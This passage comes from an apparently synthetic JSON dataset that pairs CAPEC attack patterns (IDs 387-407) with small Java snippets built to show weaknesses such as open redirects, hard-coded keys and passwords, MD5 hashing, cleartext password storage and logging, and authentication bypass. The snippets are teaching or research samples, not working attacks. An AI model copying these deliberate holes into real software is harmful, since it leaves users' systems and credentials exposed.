        "description": "This Java servlet code demonstrates a vulnerability related to 'Application API Navigation Remapping'. The servlet generates a profile link based on a user ID parameter without validating the authenticity or integrity of the URL. This can be exploited by an attacker to manipulate the URL, leading to potential phishing attacks or redirecting users to malicious sites. The code also lacks proper encryption and validation mechanisms, making it susceptible to various attacks as described in the related CWEs."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String redirectUrl = request.getParameter(\"redirectUrl\");\n        String userData = request.getParameter(\"userData\");\n\n        // CWE-345: Insufficient Verification of Data Authenticity\n        if (userData != null && userData.equals(\"trustedData\")) {\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            response.sendRedirect(redirectUrl);\n        } else {\n            response.getWriter().write(\"Invalid data\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to 'Navigation Remapping To Propagate Malicious Content' (CAPEC). The servlet processes POST requests and reads parameters 'redirectUrl' and 'userData' from the client. The code checks if 'userData' equals 'trustedData' and then redirects the client to 'redirectUrl'. This embodies CWE-345 (Insufficient Verification of Data Authenticity) as it does not properly verify the authenticity of 'userData'. Additionally, it represents CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on the client to provide a valid 'redirectUrl', which can be manipulated by an attacker to redirect users to malicious sites. The code snippet highlights how improper validation and reliance on client-side data can lead to security vulnerabilities."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class ButtonHijackingExample {\n    private static Map<String, String> buttonLinks = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Initial button setup\n        buttonLinks.put(\"submit\", \"https://trustedsite.com/submit\");\n        buttonLinks.put(\"cancel\", \"https://trustedsite.com/cancel\");\n\n        // Simulate an attacker modifying the button link\n        modifyButtonLink(\"submit\", \"https://attackersite.com/submit\");\n\n        // User clicks the submit button\n        String submitLink = getButtonLink(\"submit\");\n        System.out.println(\"User is redirected to: \" + submitLink);\n    }\n\n    // Function to modify button link (vulnerable to attack)\n    public static void modifyButtonLink(String button, String newLink) {\n        buttonLinks.put(button, newLink);\n    }\n\n    // Function to get button link\n    public static String getButtonLink(String button) {\n        return buttonLinks.get(button);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of Application API Button Hijacking. The `buttonLinks` map stores the URLs associated with different buttons in an application. The `modifyButtonLink` method allows modification of these URLs, which is a vulnerability as it does not verify the authenticity or origin of the new link (CWE-345, CWE-346). This can lead to an attacker changing the destination of a button to a malicious site (CWE-471). The `getButtonLink` method retrieves the URL for a button, and in this example, the user is redirected to the attacker's site when they click the 'submit' button. This code lacks proper data validation and security measures, such as encryption (CWE-311) and server-side enforcement (CWE-602), making it susceptible to manipulation."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class ContentSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/api/data\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            String payload = \"{\\\"user\\\":\\\"admin\\\", \\\"auth\\\":\\\"false\\\"}\";\n            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n            writer.write(payload);\n            writer.flush();\n            writer.close();\n\n            // Read response\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            StringBuilder response = new StringBuilder();\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n\n            // Output the response\n            System.out.println(\"Response: \" + response.toString());\n\n            // CWE-353: Missing Support for Integrity Check\n            // No integrity check on the response data\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of content spoofing via application API manipulation. The code sends a POST request to a hypothetical API endpoint with a payload that includes a spoofed user and authentication status. This represents CWE-602, where the client-side enforces security that should be handled server-side. The response from the server is read and printed without any integrity checks, illustrating CWE-353. This lack of integrity verification allows an attacker to manipulate the data in transit, potentially leading to content spoofing attacks."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class PhysicalSecurityBypass {\n    private static final Logger logger = Logger.getLogger(PhysicalSecurityBypass.class.getName());\n    private static final String LOCK_FILE = \"/path/to/lockfile\";\n    private static final String ALERT_FILE = \"/path/to/alertfile\";\n\n    public static void main(String[] args) {\n        try {\n            // Bypass physical lock by deleting lock file\n            Files.deleteIfExists(Paths.get(LOCK_FILE));\n            logger.log(Level.INFO, \"Lock file deleted, physical lock bypassed.\");\n\n            // Disable alert by deleting alert file\n            Files.deleteIfExists(Paths.get(ALERT_FILE));\n            logger.log(Level.INFO, \"Alert file deleted, alerts disabled.\");\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"An error occurred while bypassing physical security.\", e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of bypassing physical security mechanisms by deleting critical files that represent physical locks and alert systems. The `LOCK_FILE` and `ALERT_FILE` are placeholders for files that control physical access and alert mechanisms, respectively. By deleting these files, the code simulates bypassing physical security (CAPEC-Physical Security Bypass) and disabling alerts (CWE-1320). The code also logs actions to provide feedback on the operations performed. This example highlights vulnerabilities related to improper physical access control (CWE-1263) and improper protection for outbound error messages and alert signals (CWE-1320)."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "public class PhysicalLockBypass {\n    private boolean lockEngaged = true;\n    private boolean debugMode = false;\n\n    public void engageLock() {\n        if (!debugMode) {\n            lockEngaged = true;\n            System.out.println(\"Lock engaged.\");\n        } else {\n            System.out.println(\"Cannot engage lock in debug mode.\");\n        }\n    }\n\n    public void bypassLock() {\n        if (debugMode) {\n            lockEngaged = false;\n            System.out.println(\"Lock bypassed in debug mode.\");\n        } else {\n            System.out.println(\"Lock cannot be bypassed.\");\n        }\n    }\n\n    public void setDebugMode(boolean mode) {\n        debugMode = mode;\n        System.out.println(\"Debug mode set to: \" + debugMode);\n    }\n\n    public boolean isLockEngaged() {\n        return lockEngaged;\n    }\n\n    public static void main(String[] args) {\n        PhysicalLockBypass lockSystem = new PhysicalLockBypass();\n        lockSystem.engageLock();\n        System.out.println(\"Lock status: \" + lockSystem.isLockEngaged());\n\n        lockSystem.setDebugMode(true);\n        lockSystem.bypassLock();\n        System.out.println(\"Lock status: \" + lockSystem.isLockEngaged());\n    }\n}",
        "description": "This Java code snippet represents a simplified model of bypassing physical locks, inspired by the CAPEC description and related CWEs. The `PhysicalLockBypass` class simulates a lock mechanism with methods to engage and bypass the lock. The `debugMode` flag represents a condition where security measures can be overridden, reflecting CWE-1234 (Hardware Internal or Debug Modes Allow Override of Locks). The `bypassLock` method allows the lock to be bypassed if `debugMode` is enabled, demonstrating a potential vulnerability where physical security can be compromised. This code highlights the importance of ensuring that debug modes or similar features do not undermine physical security controls."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "public class LockBumpingExample {\n    private static final String HARD_CODED_KEY = \"1234567890abcdef\"; // CWE-321\n    private boolean lockBit = true; // CWE-1231\n    private boolean powerState = true; // CWE-1232\n    private int[] addressRegion = new int[100]; // CWE-1222\n\n    public void bumpLock() {\n        if (lockBit) {\n            System.out.println(\"Lock is set. Attempting to bump...\");\n            // Simulate bumping by toggling the lock bit\n            lockBit = false;\n            System.out.println(\"Lock bumped. Access granted.\");\n        } else {\n            System.out.println(\"Lock is already open.\");\n        }\n    }\n\n    public void powerTransition() {\n        powerState = !powerState;\n        if (!powerState) {\n            // Simulate improper lock behavior after power state transition\n            lockBit = true;\n            System.out.println(\"Power down. Lock bit reset.\");\n        } else {\n            System.out.println(\"Power up. Lock bit remains: \" + lockBit);\n        }\n    }\n\n    public static void main(String[] args) {\n        LockBumpingExample example = new LockBumpingExample();\n        example.bumpLock(); // Attempt to bump the lock\n        example.powerTransition(); // Simulate power state transition\n        example.bumpLock(); // Attempt to bump the lock again\n    }\n}",
        "description": "This Java code snippet simulates the concept of lock bumping and incorporates related weaknesses. The `bumpLock` method represents the act of bumping a lock, where the lock bit is toggled to simulate gaining unauthorized access (CWE-1231). The `powerTransition` method simulates a power state transition, which improperly resets the lock bit (CWE-1232). The use of a hard-coded key (CWE-321) and a large address region (CWE-1222) are included to provide additional context. The main idea is to demonstrate how an attacker might exploit these weaknesses to gain unauthorized access."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "import java.util.concurrent.locks.ReentrantLock;\n\npublic class LockPickingExample {\n    private static final ReentrantLock lock = new ReentrantLock();\n    private static boolean lockBit = false;\n\n    public static void main(String[] args) {\n        // Simulate improper prevention of lock bit modification (CWE-1231)\n        lockBit = true; // Lock bit is set\n        System.out.println(\"Lock bit set: \" + lockBit);\n\n        // Simulate an attacker modifying the lock bit\n        lockBit = false; // Lock bit is modified\n        System.out.println(\"Lock bit modified: \" + lockBit);\n\n        // Simulate insufficient granularity of address regions (CWE-1222)\n        if (lockBit) {\n            lock.lock();\n            try {\n                // Critical section\n                System.out.println(\"Critical section accessed\");\n            } finally {\n                lock.unlock();\n            }\n        } else {\n            System.out.println(\"Lock bit not set, access denied\");\n        }\n\n        // Simulate unrestricted externally accessible lock (CWE-412)\n        if (!lock.isLocked()) {\n            lock.lock();\n            try {\n                // Critical section\n                System.out.println(\"Externally controlled lock accessed\");\n            } finally {\n                lock.unlock();\n            }\n        }\n\n        // Simulate unlock of a resource that is not locked (CWE-832)\n        try {\n            lock.unlock();\n        } catch (IllegalMonitorStateException e) {\n            System.out.println(\"Attempted to unlock a resource that is not locked\");\n        }\n\n        // Simulate deadlock (CWE-833)\n        Thread t1 = new Thread(() -> {\n            lock.lock();\n            try {\n                Thread.sleep(1000);\n                lock.lock();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            } finally {\n                lock.unlock();\n                lock.unlock();\n            }\n        });\n\n        Thread t2 = new Thread(() -> {\n            lock.lock();\n            try {\n                Thread.sleep(1000);\n                lock.lock();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            } finally {\n                lock.unlock();\n                lock.unlock();\n            }\n        });\n\n        t1.start();\n        t2.start();\n    }\n}",
        "description": "This Java code snippet demonstrates various vulnerabilities related to lock picking and lock management, inspired by the CAPEC description and related CWEs. The code includes:\n\n1. **Improper Prevention of Lock Bit Modification (CWE-1231)**: The lock bit is set and then modified, simulating an attacker's ability to change the lock bit value.\n2. **Insufficient Granularity of Address Regions Protected by Register Locks (CWE-1222)**: The code checks the lock bit before accessing a critical section, highlighting the conflict between functional and security requirements.\n3. **Unrestricted Externally Accessible Lock (CWE-412)**: The code demonstrates an externally controlled lock being accessed without proper restrictions.\n4. **Unlock of a Resource that is not Locked (CWE-832)**: The code attempts to unlock a resource that is not locked, catching the resulting exception.\n5. **Deadlock (CWE-833)**: The code creates a deadlock scenario with two threads trying to acquire the same lock, resulting in a deadlock situation.\n\nOverall, the code illustrates the main idea of lock picking and related vulnerabilities in a software context."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "public class LockMechanism {\n    private boolean lockBit = false;\n    private boolean powerState = true; // true for active, false for low power\n    private int[] keyPins = new int[5];\n    private int[] driverPins = new int[5];\n\n    public LockMechanism() {\n        // Initialize pins\n        for (int i = 0; i < 5; i++) {\n            keyPins[i] = 1;\n            driverPins[i] = 1;\n        }\n    }\n\n    public synchronized void setLockBit() {\n        if (!lockBit) {\n            lockBit = true;\n        }\n    }\n\n    public synchronized void modifyLockBit() {\n        // CWE-1231: Improper Prevention of Lock Bit Modification\n        lockBit = false; // Vulnerability: lock bit can be modified after being set\n    }\n\n    public synchronized void powerTransition() {\n        // CWE-1232: Improper Lock Behavior After Power State Transition\n        powerState = !powerState;\n        if (!powerState) {\n            lockBit = false; // Vulnerability: lock bit becomes modifiable after power state transition\n        }\n    }\n\n    public synchronized void snapGunAttack() {\n        // Simulate snap gun attack by forcing all pins\n        for (int i = 0; i < 5; i++) {\n            keyPins[i] = 0;\n            driverPins[i] = 0;\n        }\n        // Lock is now forced open\n    }\n\n    public static void main(String[] args) {\n        LockMechanism lock = new LockMechanism();\n        lock.setLockBit();\n        lock.modifyLockBit(); // Exploit CWE-1231\n        lock.powerTransition(); // Exploit CWE-1232\n        lock.snapGunAttack(); // Simulate CAPEC attack\n    }\n}",
        "description": "This Java code snippet represents a simplified lock mechanism that can be exploited using a snap gun attack, as described in the CAPEC. The lock mechanism has key pins and driver pins that can be forced into alignment by a snap gun attack, simulating the physical attack on a lock. The code also includes vulnerabilities related to lock bit modification (CWE-1231) and improper lock behavior after power state transitions (CWE-1232). The `modifyLockBit` method allows the lock bit to be reset after it has been set, and the `powerTransition` method makes the lock bit modifiable after a power state change, both of which represent security weaknesses in the system."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "import java.util.Arrays;\n\npublic class AccessControl {\n    // CWE-321: Use of Hard-coded Cryptographic Key\n    private static final byte[] HARD_CODED_KEY = {0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF};\n\n    public static void main(String[] args) {\n        byte[] cardData = {0x10, 0x20, 0x30, 0x40};\n        if (authenticate(cardData)) {\n            System.out.println(\"Access Granted\");\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n\n    // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    private static boolean authenticate(byte[] cardData) {\n        byte[] encryptedData = simpleEncrypt(cardData, HARD_CODED_KEY);\n        byte[] expectedData = {0x5A, 0x6B, 0x7C, 0x8D}; // Simulated expected encrypted data\n        return Arrays.equals(encryptedData, expectedData);\n    }\n\n    private static byte[] simpleEncrypt(byte[] data, byte[] key) {\n        byte[] encrypted = new byte[data.length];\n        for (int i = 0; i < data.length; i++) {\n            encrypted[i] = (byte) (data[i] ^ key[i % key.length]); // Simple XOR encryption\n        }\n        return encrypted;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified electronic access control system that uses a hard-coded cryptographic key (CWE-321) and a broken or risky cryptographic algorithm (CWE-327). The `HARD_CODED_KEY` is used to encrypt card data using a simple XOR encryption method. The `authenticate` method checks if the encrypted card data matches the expected encrypted data. This code embodies the main idea of CAPEC-115, 'Bypassing Electronic Locks and Access Controls,' by illustrating how an attacker could exploit the use of a hard-coded key and a weak encryption algorithm to bypass access controls."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class CardAuthentication {\n    private static final String SECRET_KEY = \"secret\";\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String cardData = \"1234567890\"; // Simulated card data\n        String hashedData = hashCardData(cardData);\n        System.out.println(\"Hashed Card Data: \" + hashedData);\n\n        // Simulate an authentication check\n        if (authenticateCard(cardData, hashedData)) {\n            System.out.println(\"Authentication Successful\");\n        } else {\n            System.out.println(\"Authentication Failed\");\n        }\n    }\n\n    private static String hashCardData(String data) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        md.update((data + SECRET_KEY).getBytes());\n        byte[] digest = md.digest();\n        return Base64.getEncoder().encodeToString(digest);\n    }\n\n    private static boolean authenticateCard(String cardData, String hashedData) throws NoSuchAlgorithmException {\n        // CWE-290: Authentication Bypass by Spoofing\n        // CWE-294: Authentication Bypass by Capture-replay\n        String newHash = hashCardData(cardData);\n        return newHash.equals(hashedData);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified card authentication system that embodies the main idea of CAPEC-397, CAPEC-398, CAPEC-399, and CAPEC-400. The code uses a broken cryptographic algorithm (MD5) to hash card data, which is a risky practice (CWE-327). The authentication function checks if the hashed card data matches the stored hash, which is vulnerable to spoofing (CWE-290) and capture-replay attacks (CWE-294). An attacker could easily sniff the hashed data and replay it to bypass authentication, highlighting the vulnerabilities in the system."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "import java.util.Arrays;\n\npublic class MagStripeCard implements Cloneable {\n    private byte[] cardData;\n    private String sensitiveInfo;\n\n    public MagStripeCard(byte[] cardData, String sensitiveInfo) {\n        this.cardData = cardData;\n        this.sensitiveInfo = sensitiveInfo;\n    }\n\n    public byte[] getCardData() {\n        return cardData;\n    }\n\n    public String getSensitiveInfo() {\n        return sensitiveInfo;\n    }\n\n    @Override\n    protected Object clone() throws CloneNotSupportedException {\n        return super.clone();\n    }\n\n    public static void main(String[] args) {\n        byte[] originalCardData = {0x12, 0x34, 0x56, 0x78};\n        MagStripeCard originalCard = new MagStripeCard(originalCardData, \"Sensitive Info\");\n\n        try {\n            MagStripeCard clonedCard = (MagStripeCard) originalCard.clone();\n            System.out.println(\"Original Card Data: \" + Arrays.toString(originalCard.getCardData()));\n            System.out.println(\"Cloned Card Data: \" + Arrays.toString(clonedCard.getCardData()));\n            System.out.println(\"Original Sensitive Info: \" + originalCard.getSensitiveInfo());\n            System.out.println(\"Cloned Sensitive Info: \" + clonedCard.getSensitiveInfo());\n        } catch (CloneNotSupportedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability of cloning magnetic stripe cards, which is the main idea of the CAPEC. The `MagStripeCard` class contains sensitive information and card data, and it implements the `Cloneable` interface, making it possible to create a duplicate of the card. The `main` method creates an instance of `MagStripeCard` and then clones it, showing that both the card data and sensitive information are duplicated. This represents the ease with which an attacker can clone a magnetic stripe card if they have access to it, highlighting the risk of using cloneable classes containing sensitive information (CWE-498)."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "import java.util.Random;\n\npublic class MagneticStripCardBruteForce {\n    private static final String HARD_CODED_KEY = \"1234567890ABCDEF\"; // CWE-321\n    private static final int MAX_ATTEMPTS = 1000; // CWE-307\n\n    public static void main(String[] args) {\n        String cardData = \"1234567890123456\"; // Example card data\n        for (int i = 0; i < MAX_ATTEMPTS; i++) {\n            String generatedCard = generateCardData();\n            if (authenticate(generatedCard)) { // CWE-290\n                System.out.println(\"Access Granted with card: \" + generatedCard);\n                break;\n            }\n        }\n    }\n\n    private static String generateCardData() {\n        Random random = new Random();\n        StringBuilder cardData = new StringBuilder();\n        for (int i = 0; i < 16; i++) {\n            cardData.append(random.nextInt(10));\n        }\n        return cardData.toString();\n    }\n\n    private static boolean authenticate(String cardData) {\n        // Simulate a broken cryptographic check (CWE-327)\n        return cardData.equals(HARD_CODED_KEY);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a magnetic strip card brute force attack. The code attempts to generate valid card data by brute-forcing through multiple attempts (CWE-307). It uses a hard-coded cryptographic key (CWE-321) for authentication, which is a significant security flaw. The `authenticate` method simulates a broken cryptographic check (CWE-327) and an authentication bypass by spoofing (CWE-290). The code represents the main idea of CAPEC-111, where an adversary analyzes and generates valid card sequences to gain unauthorized access."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class RFIDCloningExample {\n    private static Map<String, String> rfidDatabase = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Adding RFID tags to the database\n        rfidDatabase.put(\"123456\", \"EmployeeA\");\n        rfidDatabase.put(\"654321\", \"EmployeeB\");\n\n        // Simulating an attacker cloning an RFID tag\n        String clonedRFID = cloneRFID(\"123456\");\n\n        // Attempting to access with the cloned RFID\n        if (authenticate(clonedRFID)) {\n            System.out.println(\"Access Granted\");\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n\n    // Function to clone an RFID tag\n    private static String cloneRFID(String originalRFID) {\n        // Insecure cloning mechanism\n        return originalRFID; // CWE-1294: Insecure Security Identifier Mechanism\n    }\n\n    // Function to authenticate using RFID\n    private static boolean authenticate(String rfid) {\n        // CWE-1290: Incorrect Decoding of Security Identifiers\n        // CWE-694: Use of Multiple Resources with Duplicate Identifier\n        return rfidDatabase.containsKey(rfid);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of RFID cloning vulnerability. The `rfidDatabase` simulates a database of valid RFID tags. The `cloneRFID` function represents an insecure mechanism to clone an RFID tag, directly returning the original RFID identifier (CWE-1294). The `authenticate` function checks if the cloned RFID exists in the database, which could lead to unauthorized access if the RFID is cloned (CWE-1290, CWE-694). This example highlights the ease with which RFID tags can be cloned and reused, leading to potential security breaches."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class RFIDChip {\n    private boolean isActive = true;\n    private Map<String, String> internalRegisters = new HashMap<>();\n\n    public RFIDChip() {\n        // Initialize internal registers with some dummy data\n        internalRegisters.put(\"register1\", \"value1\");\n        internalRegisters.put(\"register2\", \"value2\");\n    }\n\n    // Simulate improper access control to internal registers\n    public void accessInternalRegister(String register, String value) {\n        if (internalRegisters.containsKey(register)) {\n            internalRegisters.put(register, value);\n            System.out.println(\"Register \" + register + \" updated to \" + value);\n        } else {\n            System.out.println(\"Register not found\");\n        }\n    }\n\n    // Simulate deactivation of the RFID chip\n    public void deactivateChip() {\n        isActive = false;\n        System.out.println(\"RFID chip deactivated\");\n    }\n\n    // Check if the chip is active\n    public boolean isActive() {\n        return isActive;\n    }\n\n    public static void main(String[] args) {\n        RFIDChip chip = new RFIDChip();\n        System.out.println(\"Chip active: \" + chip.isActive());\n\n        // Unauthorized access to internal registers\n        chip.accessInternalRegister(\"register1\", \"new_value1\");\n\n        // Deactivate the chip\n        chip.deactivateChip();\n        System.out.println(\"Chip active: \" + chip.isActive());\n    }\n}",
        "description": "This Java code snippet represents the concept of 'RFID Chip Deactivation or Destruction' by simulating an RFID chip with internal registers that can be accessed and modified without proper access control (CWE-1191). The `accessInternalRegister` method allows unauthorized modification of internal registers, and the `deactivateChip` method simulates the deactivation of the RFID chip, rendering it unresponsive. The main idea is to show how improper access control can lead to unauthorized actions, such as deactivating the RFID chip, which aligns with the CAPEC description."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "public class HardwareAccessControl {\n    private boolean isAccessGranted = false;\n    private boolean isDebugModeEnabled = false;\n\n    public void grantAccess(String password) {\n        if (\"securePassword\".equals(password)) {\n            isAccessGranted = true;\n        }\n    }\n\n    public void enableDebugMode() {\n        if (isAccessGranted) {\n            isDebugModeEnabled = true;\n        }\n    }\n\n    public void modifyHardware() {\n        if (isDebugModeEnabled) {\n            // Simulate hardware modification\n            System.out.println(\"Hardware modified.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        HardwareAccessControl hac = new HardwareAccessControl();\n        hac.grantAccess(\"securePassword\");\n        hac.enableDebugMode();\n        hac.modifyHardware();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario where improper physical access control and the ability to enable debug mode at runtime can lead to unauthorized hardware modifications. The `grantAccess` method simulates access control using a hardcoded password, which is a weak security measure. The `enableDebugMode` method allows debug mode to be enabled if access is granted, representing CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime). The `modifyHardware` method simulates hardware modification if debug mode is enabled, highlighting the potential for an adversary to alter the system's behavior. This code embodies the main idea of CAPEC-Physically Hacking Hardware by showing how weak access control and runtime debug activation can undermine system integrity."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "import java.util.Scanner;\n\npublic class ATASecurityBypass {\n    private static final String HARD_CODED_PASSWORD = \"defaultPassword\";\n    private static boolean isAuthenticated = false;\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter ATA password: \");\n        String inputPassword = scanner.nextLine();\n\n        if (authenticate(inputPassword)) {\n            isAuthenticated = true;\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n\n        // Bypass authentication by directly updating the password\n        System.out.print(\"Enter new ATA password: \");\n        String newPassword = scanner.nextLine();\n        updatePassword(newPassword);\n        System.out.println(\"Password updated successfully.\");\n    }\n\n    private static boolean authenticate(String password) {\n        return HARD_CODED_PASSWORD.equals(password);\n    }\n\n    private static void updatePassword(String newPassword) {\n        if (isAuthenticated) {\n            // Update password logic\n            System.out.println(\"Password updated to: \" + newPassword);\n        } else {\n            // Bypass authentication check\n            System.out.println(\"Bypassing authentication to update password to: \" + newPassword);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Bypassing ATA Password Security' vulnerability. The code includes a hard-coded password (CWE-259) and an improper authorization check (CWE-285). The `authenticate` method checks if the input password matches the hard-coded password. If authenticated, the user is granted access. However, the `updatePassword` method allows updating the password without proper authentication, representing the bypass mechanism. This snippet highlights the security flaw where an adversary can bypass the ATA security by directly updating the password without proper authorization, reflecting the main idea of the CAPEC."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        storeSensitiveData(sensitiveData);\n    }\n\n    public static void storeSensitiveData(String data) {\n        try {\n            File file = new File(\"sensitiveData.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(data);\n            writer.close();\n            logger.info(\"Sensitive data stored successfully.\");\n        } catch (IOException e) {\n            logger.severe(\"Failed to store sensitive data.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable approach to storing sensitive data, embodying the deprecated CAPEC-118 and related CWEs. The code writes sensitive information (a password) directly to a file without any encryption or protection, which is a common issue highlighted by CWE-217 (Failure to Protect Stored Data from Modification) and CWE-218 (Failure to provide confidentiality for stored data). Additionally, the use of logging to indicate the storage of sensitive data can lead to information exposure through server log files, as described in CWE-533. This example illustrates the importance of properly securing sensitive information both in storage and in logs."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        logSensitiveData(sensitiveData);\n        storeSensitiveData(sensitiveData);\n    }\n\n    private static void logSensitiveData(String data) {\n        // CWE-532: Information Exposure Through Log Files\n        logger.info(\"Sensitive Data: \" + data);\n    }\n\n    private static void storeSensitiveData(String data) {\n        // CWE-767: Improper Protection of Stored Data\n        File file = new File(\"sensitiveData.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates vulnerabilities related to deprecated CAPEC and CWE entries. The `logSensitiveData` method logs sensitive information, which is a vulnerability described by CWE-532 (Information Exposure Through Log Files). The `storeSensitiveData` method writes sensitive data to a file without proper protection, illustrating CWE-767 (Improper Protection of Stored Data). These vulnerabilities highlight the importance of securing sensitive information both in transit and at rest, aligning with the deprecated CAPEC's focus on information gathering and analysis."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataHandler {\n    public static void main(String[] args) {\n        String sensitiveData = \"User: admin, Password: admin123\";\n        String filePath = \"./logs/sensitive_data.log\";\n        \n        // Storing sensitive data in cleartext in a file\n        try (FileWriter writer = new FileWriter(filePath)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        \n        // Simulating improper scrubbing of sensitive data\n        File file = new File(filePath);\n        if (file.exists()) {\n            file.delete(); // This does not securely delete the file\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving' and the associated CWEs. The code stores sensitive information (username and password) in cleartext in a log file (CWE-316). It then attempts to delete the file, but the deletion is not secure, leaving the data potentially recoverable (CWE-1266). This scenario represents a situation where an adversary could search through discarded files (e.g., in a dumpster) and retrieve sensitive information that was not properly secured or scrubbed, leading to potential security breaches."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
